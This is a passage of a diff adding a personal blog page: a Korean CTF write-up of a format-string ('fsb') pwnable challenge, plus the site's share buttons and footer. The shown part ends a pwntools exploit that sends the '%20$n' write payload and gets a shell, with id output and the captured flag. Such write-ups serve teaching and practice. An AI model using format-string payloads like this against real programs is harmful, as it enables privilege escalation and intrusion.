+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;%20$n&#34;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">Wait a sec...
+key :
+<span class="m">0</span>
+Congratz!
+$ id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1046</span><span class="o">(</span>fsb<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1046</span><span class="o">(</span>fsb<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span><span class="m">1047</span><span class="o">(</span>fsb_pwn<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1047</span><span class="o">(</span>fsb_pwn<span class="o">)</span>,1046<span class="o">(</span>fsb<span class="o">)</span></code></pre></div>
+<p>짜잔 cat flag !</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">$ cat flag
+Have you ever saw an example of utilizing <span class="o">[</span>n<span class="o">]</span> format character?? :<span class="o">(</span></code></pre></div>
+
+        
+          <div class="blog-tags">
+            
+              <a href="https://eiparyen.github.io/tags/pwnable/">pwnable</a>&nbsp;
+            
+          </div>
+        
+
+        
+            <hr/>
+            <section id="social-share">
+              <div class="list-inline footer-links">
+                
+
+<div class="share-box" aria-hidden="true">
+    <ul class="share">
+      
+      <li>
+        <a href="//twitter.com/share?url=https%3a%2f%2feiparyen.github.io%2fpwnable%2f2018-12-17%2f&amp;text=1st%20Problem%20-%20dowoo&amp;via=" target="_blank" title="Share on Twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//plus.google.com/share?url=https%3a%2f%2feiparyen.github.io%2fpwnable%2f2018-12-17%2f" target="_blank" title="Share on Google Plus">
+          <i class="fab fa-google-plus"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2feiparyen.github.io%2fpwnable%2f2018-12-17%2f" target="_blank" title="Share on Facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//reddit.com/submit?url=https%3a%2f%2feiparyen.github.io%2fpwnable%2f2018-12-17%2f&amp;title=1st%20Problem%20-%20dowoo" target="_blank" title="Share on Reddit">
+          <i class="fab fa-reddit"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2feiparyen.github.io%2fpwnable%2f2018-12-17%2f&amp;title=1st%20Problem%20-%20dowoo" target="_blank" title="Share on LinkedIn">
+          <i class="fab fa-linkedin"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.stumbleupon.com/submit?url=https%3a%2f%2feiparyen.github.io%2fpwnable%2f2018-12-17%2f&amp;title=1st%20Problem%20-%20dowoo" target="_blank" title="Share on StumbleUpon">
+          <i class="fab fa-stumbleupon"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2feiparyen.github.io%2fpwnable%2f2018-12-17%2f&amp;description=1st%20Problem%20-%20dowoo" target="_blank" title="Share on Pinterest">
+          <i class="fab fa-pinterest"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+  
+              </div>
+            </section>
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://eiparyen.github.io/pwnable/2018-12-19/" data-toggle="tooltip" data-placement="top" title="2st Problem - dowoo">&larr; Previous Post</a>
+            </li>
+          
+          
+        </ul>
+      
+
+
+      
+        
+          
+          <div class="disqus-comments">                  
+            <button id="show-comments" class="btn btn-default" type="button">Show <span class="disqus-comment-count" data-disqus-url="https://eiparyen.github.io/pwnable/2018-12-17">comments</span></button>
+            <div id="disqus_thread"></div>
+
+            <script type="text/javascript">
+              var disqus_config = function () {
+              this.page.url = 'https:\/\/eiparyen.github.io\/pwnable\/2018-12-17';
+            };
+
+          </script>
+          </div>
+          
+        
+        
+      
+
+    </div>
+  </div>
+</div>
+
+    <footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+          <li>
+            
+            <a href="https://eiparyen.github.io/index.xml" title="RSS">
+            
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            2018
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://eiparyen.github.io">Eiparyen</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="http://gohugo.io">Hugo v0.54-DEV</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="https://eiparyen.github.io/js/main.js"></script>
+<script src="https://eiparyen.github.io/js/highlight.min.js"></script>
+<script> hljs.initHighlightingOnLoad(); </script>
+<script> $(document).ready(function() {$("pre.chroma").css("padding","0");}); </script><script> renderMathInElement(document.body); </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script>
+<script src="https://eiparyen.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+<script type="text/javascript">
+$(function(){
+  $('#show-comments').on('click', function(){
+    var disqus_shortname = 'eiparyen';
+      
+    (function() {
+      var disqus = document.createElement('script'); 
+      disqus.type = 'text/javascript'; 
+      disqus.async = true;
+      disqus.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(disqus);
+    })();
+      
+    $(this).hide(); 
+    });
+  });
+      
+</script>
+<script id="dsq-count-scr" src="//eiparyen.disqus.com/count.js" async></script>
+
+
+
+
+  </body>
+</html>
+
